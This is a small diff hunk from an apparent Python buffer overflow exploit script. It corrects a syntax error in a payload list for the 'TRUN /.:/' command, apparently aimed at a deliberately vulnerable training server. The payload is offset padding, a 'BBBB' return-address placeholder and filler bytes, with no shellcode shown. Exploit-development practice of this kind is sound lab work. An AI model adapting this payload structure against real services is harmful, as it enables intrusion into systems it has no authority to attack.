@@ -11,7 +11,7 @@ try:
 
     payload = [
         b"TRUN /.:/",
-        b"A" * offset.
+        b"A" * offset,
         b"BBBB",
         b"C" * 976
     ]
